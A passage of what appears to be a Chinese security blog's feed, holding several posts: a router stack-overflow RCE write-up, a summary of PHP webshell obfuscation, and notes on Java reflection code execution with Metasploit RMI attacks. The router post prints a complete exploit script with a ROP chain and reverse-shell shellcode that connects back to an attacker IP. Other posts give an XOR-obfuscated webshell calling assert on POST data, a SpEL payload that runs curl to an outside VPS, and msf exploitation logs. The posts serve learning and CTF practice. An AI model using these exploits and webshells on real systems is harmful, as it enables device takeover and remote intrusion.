newlocation.\r\n\t\t&lt;/body&gt;&lt;/html&gt;\r\n"</span></span><br><span class="line">        ,pcParm2);</span><br><span class="line">req_write(iParm1,acStack480);</span><br></pre></td></tr></table></figure></p><p>在<code>send_r_moved_perm</code>函数中两次调用了<code>sprintf</code>函数分别向acStack224(sp+0x19f8-0xe0)和acStack480(sp+0x19f8-0x1e0)中输入字符。</p><blockquote><p>通过第二两个sprintf修改返回地址，构造ROP链，导致程序控制流被劫持。（也可以通过两个sprintf的配合来实现栈的迁移，漏洞作者是这么实现的）</p></blockquote><p>在mips虚拟机中尝试运行程序但是失败了,<code>firmadyne</code>模拟固件也没成功</p><p>记录一下其实是文件损坏了所以qemu模拟不了</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ecutable, MIPS, MIPS-I version 1 (SYSV), dynamically linked (uses shared libs), corrupted section header size</span><br></pre></td></tr></table></figure></p><p>在我的WSL中使用最新的qemu是可以模拟的</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  squashfs-root-0 sudo chroot . ./qemu ./bin/boa                                                                       Initialize AP MIB failed!</span><br><span class="line">qemu: uncaught target signal 11 (Segmentation fault) - core dumped</span><br><span class="line">[1]    363 segmentation fault (core dumped)  sudo chroot . ./qemu ./bin/boa</span><br></pre></td></tr></table></figure></p><p>那看来需要更新一下qemu版本了</p><p><img src="/2019/10/05/lu-you-qi-xiang-guan-rce-lou-dong-fen-xi/assets/IOT0.png" alt="1570364860196"></p><p>记录一下exp</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line">context.arch=<span class="string">'mips'</span></span><br><span class="line">context.endian=<span class="string">'big'</span></span><br><span class="line">ip=<span class="string">'192.168.75.150'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">syscmd1</span><span class="params">(a)</span>:</span></span><br><span class="line">    p=remote(ip,<span class="number">80</span>)</span><br><span class="line">    z=len(a)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[+]len:"</span>+str(z)</span><br><span class="line">    payload=<span class="string">''</span></span><br><span class="line">    payload+=<span class="string">'POST /goform/formLanguageChange HTTP/1.1\r\n'</span></span><br><span class="line">    payload+=<span class="string">'Host: '</span>+ip+<span class="string">'\r\n'</span></span><br><span class="line">    payload+=<span class="string">'Connection: keep-alive\r\n'</span></span><br><span class="line">    payload+=<span class="string">'Accept-Encoding: gzip, deflate\r\n'</span></span><br><span class="line">    payload+=<span class="string">'Accept: */*\r\n'</span></span><br><span class="line">    payload+=<span class="string">'User-Agent: python-requests/2.18.4\r\n'</span></span><br><span class="line">    payload+=<span class="string">'Content-Length: '</span>+str(z+<span class="number">9</span>)+<span class="string">'\r\n'</span></span><br><span class="line">    payload+=<span class="string">'Content-Type: application/x-www-form-urlencoded\r\n'</span></span><br><span class="line">    payload+=<span class="string">'\r\n'</span></span><br><span class="line">    payload+=<span class="string">'currTime='</span></span><br><span class="line">    payload+=a+<span class="string">'\r\n'</span></span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.recvuntil(<span class="string">'&lt;/html&gt;'</span>)</span><br><span class="line">    <span class="comment">#raw_input()</span></span><br><span class="line">    p.close()</span><br><span class="line"></span><br><span class="line"><span class="comment">#base address of libc.so.0</span></span><br><span class="line">base1=<span class="number">0x2ab88000</span></span><br><span class="line"><span class="comment">###shellcode</span></span><br><span class="line">sc=struct.pack(<span class="string">"&gt;I"</span>,<span class="number">0x24060101</span>)</span><br><span class="line">sc+=struct.pack(<span class="string">"&gt;I"</span>,<span class="number">0x04d0ffff</span>)</span><br><span class="line">sc+=struct.pack(<span class="string">"&gt;I"</span>,<span class="number">0x2806ffff</span>)</span><br><span class="line">sc+=struct.pack(<span class="string">"&gt;I"</span>,<span class="number">0x27bdffe0</span>)</span><br><span class="line">sc+=struct.pack(<span class="string">"&gt;I"</span>,<span class="number">0x27e41001</span>)</span><br><span class="line">sc+=struct.pack(<span class="string">"&gt;I"</span>,<span class="number">0x2484f023</span>)</span><br><span class="line">sc+=struct.pack(<span class="string">"&gt;I"</span>,<span class="number">0xafa4ffe8</span>)</span><br><span class="line">sc+=struct.pack(<span class="string">"&gt;I"</span>,<span class="number">0xafa0ffec</span>)</span><br><span class="line">sc+=struct.pack(<span class="string">"&gt;I"</span>,<span class="number">0x27a5ffe8</span>)</span><br><span class="line">sc+=struct.pack(<span class="string">"&gt;I"</span>,<span class="number">0x24020fab</span>)</span><br><span class="line">sc+=struct.pack(<span class="string">"&gt;I"</span>,<span class="number">0xafa00108</span>)</span><br><span class="line">sc+=struct.pack(<span class="string">"&gt;I"</span>,<span class="number">0x0101010c</span>)</span><br><span class="line">sc+=<span class="string">"/bin//sh\x00"</span></span><br><span class="line"></span><br><span class="line">shellcode =<span class="string">''</span></span><br><span class="line">shellcode += asm(shellcraft.connect(<span class="string">'192.168.75.149'</span>,<span class="number">5555</span>))</span><br><span class="line">shellcode += asm(shellcraft.dup2(<span class="number">5</span>,<span class="number">0</span>))</span><br><span class="line">shellcode += asm(shellcraft.dup2(<span class="number">5</span>,<span class="number">1</span>))</span><br><span class="line">shellcode += sc</span><br><span class="line"></span><br><span class="line">s0=struct.pack(<span class="string">"&gt;I"</span>,base1+<span class="number">0x2C794</span>)</span><br><span class="line">s1=struct.pack(<span class="string">"&gt;I"</span>,base1+<span class="number">0x2C794</span>)<span class="comment">### rop2:move $t9,$s2;...;jr $t9 </span></span><br><span class="line">s2=struct.pack(<span class="string">"&gt;I"</span>,base1+<span class="number">0x24b70</span>)<span class="comment">### rop3:sleep(1)</span></span><br><span class="line">s3=struct.pack(<span class="string">"&gt;I"</span>,base1+<span class="number">0x2bdac</span>)<span class="comment">### rop5:addiu $a0,$sp,0x18;...;lw $ra,0x30;jr $ra</span></span><br><span class="line">s4=struct.pack(<span class="string">"&gt;I"</span>,base1+<span class="number">0x2bdac</span>)</span><br><span class="line"><span class="comment">###rop</span></span><br><span class="line">payload1=<span class="string">'a'</span>*<span class="number">0x167</span>+s0+s1+s2+s3</span><br><span class="line">payload1+=struct.pack(<span class="string">"&gt;I"</span>,base1+<span class="number">0x25714</span>)  <span class="comment">###rop1: li $a0,1;move $t9,$s1;jalr $t9;ori $a1,$s0,2</span></span><br><span class="line">payload1+=<span class="string">'b'</span>*<span class="number">0x1c</span>+s0+s1+s2+s3+s4</span><br><span class="line">payload1+=struct.pack(<span class="string">"&gt;I"</span>,base1+<span class="number">0x5f98</span>)  <span class="comment">###rop4:lw $ra,0x1c($sp);...;jr $ra</span></span><br><span class="line">payload1+=<span class="string">'c'</span>*<span class="number">0x1c</span></span><br><span class="line">payload1+=s3</span><br><span class="line">payload1+=<span class="string">'d'</span>*<span class="number">0x18</span></span><br><span class="line">payload1+=struct.pack(<span class="string">"&gt;I"</span>,<span class="number">0x24910101</span>) <span class="comment">###rop7 addiu $s1,$a0,257;addi $s1,$s1,-257;move $t9,$s1;jalr $t9</span></span><br><span class="line">payload1+=struct.pack(<span class="string">"&gt;I"</span>,<span class="number">0x2231feff</span>)</span><br><span class="line">payload1+=struct.pack(<span class="string">"&gt;I"</span>,<span class="number">0x0220c821</span>)</span><br><span class="line">payload1+=struct.pack(<span class="string">"&gt;I"</span>,<span class="number">0x0320f809</span>)</span><br><span class="line">payload1+=struct.pack(<span class="string">"&gt;I"</span>,<span class="number">0x2231feff</span>)</span><br><span class="line">payload1+=struct.pack(<span class="string">"&gt;I"</span>,<span class="number">0x2231feff</span>)</span><br><span class="line">payload1+=struct.pack(<span class="string">"&gt;I"</span>,base1+<span class="number">0x2bda0</span>) <span class="comment">###rop6:mov $t9,$a0;...;jalr $t9</span></span><br><span class="line">payload1+=<span class="string">'e'</span>*<span class="number">0x20</span>+shellcode</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    syscmd1(payload1)</span><br></pre></td></tr></table></figure></p><h2>参考</h2><p><a href="https://xz.aliyun.com/t/90?accounttraceid=9e7417ba-17e6-409c-ae12-af7205701caa#toc-0" target="_blank" rel="noopener">D-Link-Dir-850L-远程命令执行漏洞</a></p><p><a href="https://xz.aliyun.com/t/5699#toc-0" target="_blank" rel="noopener">路由器漏洞分析系列（2）：CVE-2018-20056 DIR-619L&amp;605L 栈溢出漏洞分析及复现</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2&gt;复习一下基本知识&lt;/h2&gt;
&lt;h3&gt;postgresql数据库操作&lt;/h3&gt;
&lt;p&gt;如果是安装好了&lt;code&gt;postgresql&lt;/code&gt;数据库就会新建一个&lt;code&gt;postgreql&lt;/code&gt;用户&lt;/p&gt;
&lt;p&gt;&lt;code&gt;sudo su - postgre
      
    
    </summary>
    
      <category term="IOT" scheme="https://prontosil.club/categories/IOT/"/>
    
    
      <category term="IOT" scheme="https://prontosil.club/tags/IOT/"/>
    
      <category term="RCE" scheme="https://prontosil.club/tags/RCE/"/>
    
  </entry>
  
  <entry>
    <title>php一些webshell构造总结</title>
    <link href="https://prontosil.club/2019/10/05/php-yi-xie-webshell-gou-zao-zong-jie/"/>
    <id>https://prontosil.club/2019/10/05/php-yi-xie-webshell-gou-zao-zong-jie/</id>
    <published>2019-10-05T07:01:00.000Z</published>
    <updated>2019-10-10T13:21:31.941Z</updated>
    
    <content type="html"><![CDATA[<h2>ASCII表复习</h2><p>由于构造shell的时候都需要使用到异或等运算，所以手边一定要常备ASCII码表</p><p><img src="/2019/10/05/php-yi-xie-webshell-gou-zao-zong-jie/ascii" alt="img"></p><p>表格总共是16行8列 从0开始，到0x7f结束</p><p>记住常用的ASCII码值</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0 十进制 48 十六进制 0x30</span><br><span class="line">1 十进制 49 十六进制 0x31</span><br><span class="line"></span><br><span class="line">A 十进制 65 十六进制 0x41  其实就是跨了16行正好在相邻的列上</span><br><span class="line">a 十进制 97 十六进制 0x61  垮了两次16行</span><br></pre></td></tr></table></figure></p><h2>最基本的无字母数字webshell</h2><p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">'/[a-z0-9]/is'</span>,$_GET[<span class="string">'shell'</span>])) &#123;</span><br><span class="line">  <span class="keyword">eval</span>($_GET[<span class="string">'shell'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>参考<a href="https://www.leavesongs.com/penetration/webshell-without-alphanum.html" target="_blank" rel="noopener">p牛的文章</a></p><h3>通过异或</h3><p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$_=(<span class="string">'%01'</span>^<span class="string">'`'</span>).(<span class="string">'%13'</span>^<span class="string">'`'</span>).(<span class="string">'%13'</span>^<span class="string">'`'</span>).(<span class="string">'%05'</span>^<span class="string">'`'</span>).(<span class="string">'%12'</span>^<span class="string">'`'</span>).(<span class="string">'%14'</span>^<span class="string">'`'</span>); <span class="comment">// $_='assert';</span></span><br><span class="line">$__=<span class="string">'_'</span>.(<span class="string">'%0D'</span>^<span class="string">']'</span>).(<span class="string">'%2F'</span>^<span class="string">'`'</span>).(<span class="string">'%0E'</span>^<span class="string">']'</span>).(<span class="string">'%09'</span>^<span class="string">']'</span>); <span class="comment">// $__='_POST';</span></span><br><span class="line">$___=$$__;</span><br><span class="line">$_($___[_]); <span class="comment">// assert($_POST[_]);</span></span><br></pre></td></tr></table></figure></p><h2>取反</h2><p>核心也是构造出一个函数</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2&gt;ASCII表复习&lt;/h2&gt;
&lt;p&gt;由于构造shell的时候都需要使用到异或等运算，所以手边一定要常备ASCII码表&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2019/10/05/php-yi-xie-webshell-gou-zao-zong-jie/ascii&quot; alt=&quot;
      
    
    </summary>
    
      <category term="php" scheme="https://prontosil.club/categories/php/"/>
    
    
      <category term="php" scheme="https://prontosil.club/tags/php/"/>
    
      <category term="webshell" scheme="https://prontosil.club/tags/webshell/"/>
    
  </entry>
  
  <entry>
    <title>java代码审计基础</title>
    <link href="https://prontosil.club/2019/10/04/java-dai-ma-shen-ji-ji-chu/"/>
    <id>https://prontosil.club/2019/10/04/java-dai-ma-shen-ji-ji-chu/</id>
    <published>2019-10-04T12:47:21.000Z</published>
    <updated>2019-10-10T13:21:19.865Z</updated>
    
    <content type="html"><![CDATA[<p>是时候开始研究java代码审计了</p><h2>反射</h2><p>通过反射可以使得java语言具有动态特性</p><h3>通过java.lang.Runtime</h3><p>反射利用的代码如下：</p><p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException,NoSuchMethodException, IllegalAccessException, InvocationTargetException </span>&#123;</span><br><span class="line">    Class clazz = Class.forName(<span class="string">"java.lang.Runtime"</span>);</span><br><span class="line">    clazz.getMethod(<span class="string">"exec"</span>, String.class).invoke(clazz.getMethod(<span class="string">"getRuntime"</span>).invoke(clazz), <span class="string">"calc.exe"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><blockquote><p>java.lang.Runtime遵循单例模式，也就是说构造方法是私有的、</p></blockquote><p>查看其源码可以发现:</p><p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** Don't let anyone else instantiate this class */</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="title">Runtime</span><span class="params">()</span> </span>&#123;&#125;</span><br></pre></td></tr></table></figure></p><p>注释中特意写明了不要让任何人实例化这个类</p><p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Runtime currentRuntime = <span class="keyword">new</span> Runtime();</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Returns the runtime object associated with the current Java application.</span></span><br><span class="line"><span class="comment"> * Most of the methods of class &lt;code&gt;Runtime&lt;/code&gt; are instance</span></span><br><span class="line"><span class="comment"> * methods and must be invoked with respect to the current runtime object.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span>  the &lt;code&gt;Runtime&lt;/code&gt; object associated with the current</span></span><br><span class="line"><span class="comment"> *          Java application.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Runtime <span class="title">getRuntime</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> currentRuntime;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>遵循单例模式所以就会有一个静态方法<code>getRuntime</code></p><p>要实现反射执行<code>exec</code>，前面提到的<code>payload</code>可以分为几个部分</p><p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取到java.lang.Runtime的class对象</span></span><br><span class="line">Class clazz = Class.forName(<span class="string">"java.lang.Runtime"</span>);</span><br><span class="line">Method execMethod = clazz.getMethod(<span class="string">"exec"</span>, String.class);</span><br><span class="line">Method runtimeMethod = clazz.getMethod(<span class="string">"getRuntime"</span>);</span><br><span class="line">execMethod.invoke(runtimeMethod.invoke(clazz), <span class="string">"calc.exe"</span>);</span><br></pre></td></tr></table></figure></p><p>注意每一个反射得来的方法<code>invoke</code>的时候第一个参数必须是对象</p><h2>ProcessBuilder的利用</h2><p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//顾名思义和StringBuilder又几分相似</span></span><br><span class="line">Class clazz = Class.forName(<span class="string">"java.lang.ProcessBuilder"</span>);</span><br><span class="line">Method startMethod = clazz.getMethod(<span class="string">"start"</span>);</span><br><span class="line">startMethod.invoke(clazz.getConstructor(List.class).newInstance(Arrays.asList(<span class="string">"calc.exe"</span>)));</span><br></pre></td></tr></table></figure></p><p>同样我们通过反射拿到<code>start</code>方法，然后调用的时候，由于第一个参数必须是该类的对象，所以我们通过<code>getConstructor</code>方法拿到它的构造方法之后实例化</p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/java0.png" alt=""></p><h2>反射例题</h2><p>引用<code>code breaking</code>的一道题目</p><p>题目是一个登陆的页面，用户名和密码都是admin，登陆的时候可以勾选<code>remeber-me</code>选项</p><p>登录之后是一个hello页面</p><p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">admin</span><span class="params">(@CookieValue(value = <span class="string">"remember-me"</span>, required = <span class="keyword">false</span>)</span> String rememberMeValue,HttpSession session,Model model) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (rememberMeValue != <span class="keyword">null</span> &amp;&amp; !rememberMeValue.equals(<span class="string">""</span>)) &#123;</span><br><span class="line">            String username = userConfig.decryptRememberMe(rememberMeValue);</span><br><span class="line">            <span class="keyword">if</span> (username != <span class="keyword">null</span>) &#123;</span><br><span class="line">                session.setAttribute(<span class="string">"username"</span>, username);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Object username = session.getAttribute(<span class="string">"username"</span>);</span><br><span class="line">        <span class="keyword">if</span>(username == <span class="keyword">null</span> || username.toString().equals(<span class="string">""</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"redirect:/login"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        model.addAttribute(<span class="string">"name"</span>, getAdvanceValue(username.toString()));</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"hello"</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>勾选了<code>remember-me</code>之后，会从中解密得到<code>username</code>，然后将其传递给一个方法<code>getAdvanceValue</code>跟进这个方法：</p><p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> String <span class="title">getAdvanceValue</span><span class="params">(String val)</span> </span>&#123;</span><br><span class="line">     <span class="keyword">for</span> (String keyword: keyworkProperties.getBlacklist()) &#123;</span><br><span class="line">         Matcher matcher = Pattern.compile(keyword, Pattern.DOTALL | Pattern.CASE_INSENSITIVE).matcher(val);</span><br><span class="line">         <span class="keyword">if</span> (matcher.find()) &#123;</span><br><span class="line">             <span class="keyword">throw</span> <span class="keyword">new</span> HttpClientErrorException(HttpStatus.FORBIDDEN);</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     ParserContext parserContext = <span class="keyword">new</span> TemplateParserContext();</span><br><span class="line">     Expression exp = parser.parseExpression(val, parserContext);</span><br><span class="line">     SmallEvaluationContext evaluationContext = <span class="keyword">new</span> SmallEvaluationContext();</span><br><span class="line">     <span class="keyword">return</span> exp.getValue(evaluationContext).toString();</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></p><p>可以看到有一个黑名单，之后的几行代码是解析一个表达式并执行的</p><p>构造利用链:</p><p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String.class.getClass().forName(<span class="string">"java.l"</span>+<span class="string">"ang.Ru"</span>+<span class="string">"ntime"</span>).getMethod(<span class="string">"ex"</span>+<span class="string">"ec"</span>,String.class).invoke(String.class.getClass().forName(<span class="string">"java.l"</span>+<span class="string">"ang.Ru"</span>+<span class="string">"ntime"</span>).getMethod(<span class="string">"getRu"</span>+<span class="string">"ntime"</span>).invoke(String.class.getClass().forName(<span class="string">"java.l"</span>+<span class="string">"ang.Ru"</span>+<span class="string">"ntime"</span>)),<span class="string">"curl 39.106.125.244:8888"</span></span><br></pre></td></tr></table></figure></p><p>就用它的那个类进行加密：</p><p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></p><p>得到<code>payload</code></p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">VEdGePvYTXhp0TFlUTtEl9RimJGOGpGZmgTM181ZSAKn4ScdI0Z7KYgJhlMaf9ccTQkfOt9mgarInh090nWzls6IIWfW48Zkp8HC-rIyg6JtO-AMtI9O1NJYoSTFhcKdJqkg7VdFU-VG3b6vZrkJtwrj_i6Lv2-MBChAj5zXjZb7KGe6wnDO9NuYCGxQPgeADgBBME92fOaL3pOQp4Bte6O3gv0O3m6y09PwZ3jc-PMHalwzRzgR-M1svkqJushiOMCAj1i9rDZK3uOk1_CdFzQKq1to-MOwohuebk7d9NZRM_jWyG2fyJrqxJ6JPlquC7whDaz8Bz8gxXc2QYn2rrjhRZ0w5sn1IaRmg2DoPiel0OUd9LKMhxWDoLHZHu7X</span><br></pre></td></tr></table></figure></p><p>利用效果：</p><p>VPS监听到了请求</p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/JAVA3.png" alt=""></p><h2>RMI</h2><h3>一个探测的工具</h3><p><img src="/2019/10/04/java-dai-ma-shen-ji-ji-chu/rmi.png" alt="1570269022330"></p><p>用<code>nmap</code>扫描可以发现这次的主角<code>Java RMI Registry</code></p><p><img src="/2019/10/04/java-dai-ma-shen-ji-ji-chu/assets/rmi2" alt="1570272111203"></p><p>接下来可以使用<code>nmap</code>的脚本进行验证</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$ nmap --script=rmi-vuln-classloader -p 1099 192.168.182.134</span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2019-10-05 06:41 EDT</span><br><span class="line">Nmap scan report for 192.168.182.134</span><br><span class="line">Host is up (0.00041s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">1099/tcp open  rmiregistry</span><br><span class="line">| rmi-vuln-classloader: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   RMI registry default configuration remote code execution vulnerability</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|       Default configuration of RMI registry allows loading classes from remote URLs which can lead to remote code execution.</span><br><span class="line">|       </span><br><span class="line">|     References:</span><br><span class="line">|_      https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/misc/java_rmi_server.rb</span><br><span class="line">MAC Address: 00:0C:29:D9:A2:EA (VMware)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 0.58 seconds</span><br></pre></td></tr></table></figure></p><p>主机是有漏洞的</p><p>msf上搜索java_rmi的模块</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; search java_rmi</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                            Disclosure Date  Rank       Check  Description</span><br><span class="line">   -  ----                                            ---------------  ----       -----  -----------</span><br><span class="line">   0  auxiliary/gather/java_rmi_registry                               normal     No     Java RMI Registry Interfaces Enumeration</span><br><span class="line">   1  auxiliary/scanner/misc/java_rmi_server          2011-10-15       normal     Yes    Java RMI Server Insecure Endpoint Code Execution Scanner</span><br><span class="line">   2  exploit/multi/browser/java_rmi_connection_impl  2010-03-31       excellent  No     Java RMIConnectionImpl Deserialization Privilege Escalation</span><br><span class="line">   3  exploit/multi/misc/java_rmi_server              2011-10-15       excellent  No     Java RMI Server Insecure Default Configuration Java Code Execution</span><br></pre></td></tr></table></figure></p><p>检测到</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf5 auxiliary(scanner/misc/java_rmi_server) &gt; exploit </span><br><span class="line"></span><br><span class="line">[+] 192.168.182.134:1099  - 192.168.182.134:1099 Java RMI Endpoint Detected: Class Loader Enabled</span><br><span class="line">[*] 192.168.182.134:1099  - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure></p><p><code>Class Loader Enabled</code></p><p>使用<code>java_rmi_server</code>进行攻击，但是并没有成功</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(multi/misc/java_rmi_server) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.182.133:4444 </span><br><span class="line">[*] 192.168.182.134:1099 - Using URL: http://0.0.0.0:8080/3KFzyXCBVe</span><br><span class="line">[*] 192.168.182.134:1099 - Local IP: http://192.168.182.133:8080/3KFzyXCBVe</span><br><span class="line">[*] 192.168.182.134:1099 - 